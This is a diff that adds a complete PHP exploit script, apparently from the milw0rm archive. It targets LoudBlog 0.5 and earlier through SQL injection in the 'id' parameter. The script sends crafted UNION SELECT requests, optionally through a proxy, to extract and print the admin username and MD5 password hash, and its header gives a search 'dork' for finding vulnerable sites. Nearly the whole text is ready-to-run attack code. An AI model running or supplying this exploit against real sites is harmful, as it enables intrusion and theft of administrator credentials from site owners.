@@ -1,0 +1,148 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "LoudBlog <= 0.5 'id' SQL injection / admin credentials disclosure\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n";
+echo "a dork: \"Powered by LoudBlog\"\r\n\r\n";
+/*
+works regardless of magic_quotes_gpc settings
+*/
+
+if ($argc<3) {
+echo "Usage: php ".$argv[0]." host path OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to LoudBlog\r\n";
+echo "user/pass: you need an account\r\n";
+echo "Options:\r\n";
+echo "   -T[prefix]   specify a table prefix different from 'lb_'\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Example:\r\n";
+echo "php ".$argv[0]." localhost /loudblog/  \r\n";
+die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+function is_hash($hash)
+{
+ if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
+ else {return false;}
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$prefix="lb_";
+$proxy="";
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+if ($temp=="-T")
+{
+  $prefix=str_replace("-T","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$zeros=array(",0,0,0,0", //<- this the one I tested, may change in other versions
+	     ",0,0,0",
+	     ",0,0",
+	     ",0",
+	     ",0,0,0,0,0",
+	     ",0,0,0,0,0,0",
+	     ",0,0,0,0,0,0,0");
+
+for ($i=0; $i<count($zeros); $i++)
+{
+$sql="'UNION/**/SELECT/**/0,0,CONCAT('*_u_*',nickname,'*_u_*'),'2005-03-29 16:32:42',0,0,0,0,0,0,CONCAT('*_p_*',password,'*_p_*'),0,0,0,0,0,0,0".$zeros[$i]."/**/FROM/**/".$prefix."authors/**/WHERE/**/id=1/*";
+//debug
+//echo "sql -> ".$sql."\r\n";
+$sql=urlencode($sql);
+$packet ="GET ".$p."index.php?id=$sql HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("*_p_*",$html);
+$hash=$temp[1];
+if (is_hash($hash))
+{
+echo "-------------------------------------------------------\r\n";
+echo "password (md5) -> ".$hash."\r\n";
+$temp=explode("*_u_*",$html);
+echo "admin          -> ".$temp[1]."\r\n";
+echo "-------------------------------------------------------\r\n";
+die;
+}
+}
+//if you are here...
+echo "exploit failed...";
+?>
+
+# milw0rm.com [2006-07-21]
